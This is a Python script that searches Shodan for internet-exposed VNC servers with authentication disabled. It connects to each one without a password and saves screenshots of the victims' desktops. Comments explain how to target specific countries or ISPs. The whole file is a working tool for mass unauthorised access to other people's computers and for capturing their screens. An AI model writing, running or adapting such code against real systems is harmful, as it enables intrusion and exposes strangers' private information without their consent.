import sys
#import requests
import shodan
import shutil
from vncdotool import api

def main(argv):
    def screenShot(ipAddress, port):
        connect_string = ipAddress + '::' + port
        print(connect_string)
        filename = 'RESULTS/' + ipAddress + '_' + port + '.png'
        try:
            client = api.connect(connect_string , password=None)
            client.timeout = 30
        except:
            print('Connect Failed')
            return
        try:
            print("Attempting screen capture")
            client.captureScreen(filename)
            print("SUCCESS")
        except:
            print('Timed out')
            shutil.copy('DEFAULT.png',filename)
            client.disconnect()
        print("Disconnecting Client")
        client.disconnect()
    
    SHODAN_API_KEY = "----PUT API KEY HERE----"
    ShodanAPI = shodan.Shodan(SHODAN_API_KEY)
    serverIndex=0
    try:
        # Further refine search by adding things like country:"CN"
        # Or '"RFB 003.008"+"Authentication Disabled" port:"5900" country:"US" org:"Verizon Wireless"'
        results = ShodanAPI.search('"RFB 003.008"+"Authentication Disabled" port:"5900"')
        print('Found: {}'.format(results['total']))
        for result in results['matches']:
            serverIndex = serverIndex + 1
            print("Trying Server #", serverIndex)
            server = result['ip_str']
            screenShot(server,'5900')
    except shodan.APIError:
        print('Error: Shodan API Error')
    try:
        results = ShodanAPI.search('"RFB 003.008"+"Authentication Disabled" port:"5901"')
        print('Found: {}'.format(results['total']))
        for result in results['matches']:
            serverIndex = serverIndex + 1
            print("Trying Server #", serverIndex)
            server = result['ip_str']
            screenShot(server,'5901')
    except shodan.APIError:
        print('Error: Shodan API Error')
if __name__ == "__main__":
    main(sys.argv[1:])